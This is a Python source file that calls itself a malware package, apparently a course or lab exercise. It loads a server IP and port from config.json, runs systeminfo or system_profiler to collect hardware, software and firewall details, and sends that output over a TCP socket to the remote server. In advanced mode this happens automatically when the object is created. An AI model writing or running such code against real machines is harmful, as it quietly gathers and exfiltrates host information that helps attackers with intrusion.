# Hello, This is the malware package
# Malware to connect to the socket and send a message to the server and then close the connection.
import json
import os
import socket
import subprocess
import sys

import pyfiglet


class Malware:
    def __init__(self, advanced_mode=False):
        """
        read data from config.json file and read IP, port, and fields from it
        :param advanced_mode: if True, create fields and connect to the server and send the fields to the server
        """
        self.socket = None
        curr_dir_par = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        with open(os.path.join(curr_dir_par, 'data', 'config.json')) as f:
            data = json.load(f)
            # read IP, port from it
            self.ip = data['IP']
            self.port = data['Port']

        self.fields = data['Fields']
        if advanced_mode:
            self.create_fields()
            self.connect()
            self.send_message(self.fields)

    def connect(self):
        """
        create a socket object and connect to the server
        :return: None
        """

        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        host = socket.gethostname() if self.ip == 'localhost' else self.ip
        self.socket.connect((host, self.port))

    def get_message(self):
        """
        get message from the server
        :return: message from the server
        """
        return self.socket.recv(2048).decode('utf-8')

    def send_message(self, msg):
        """
        send message to the server
        :param msg: message to send
        :return: None
        """
        self.socket.send(msg.encode('utf-8'))

    def create_fields(self):
        """
        create fields to send to the server and save it in self.fields attribute
        :return: None
        """
        if sys.platform == 'darwin':
            proc = subprocess.Popen(
                'system_profiler SPHardwareDataType SPSoftwareDataType SPFirewallDataType', shell=True,
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        else:
            proc = subprocess.Popen('systeminfo', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
        stdout_value = proc.stdout.read() + proc.stderr.read()
        self.fields = stdout_value.decode('utf-8')

    def close(self):
        """
        close the socket connection to the server
        :return:
        """
        self.socket.close()

    def __del__(self):
        """
        close the socket connection to the server when the object is deleted
        :return:
        """
        self.close()


if __name__ == '__main__':
    print(pyfiglet.figlet_format('Part One'))
    malware = Malware()
    malware.create_fields()
    malware.connect()
    malware.send_message(f'Hello, This is the malware package, {malware.ip}')
    print(malware.get_message())
    malware.close()
    print(pyfiglet.figlet_format('Part Two'))
    malware = Malware(advanced_mode=True)
    print(malware.get_message())
    malware.close()
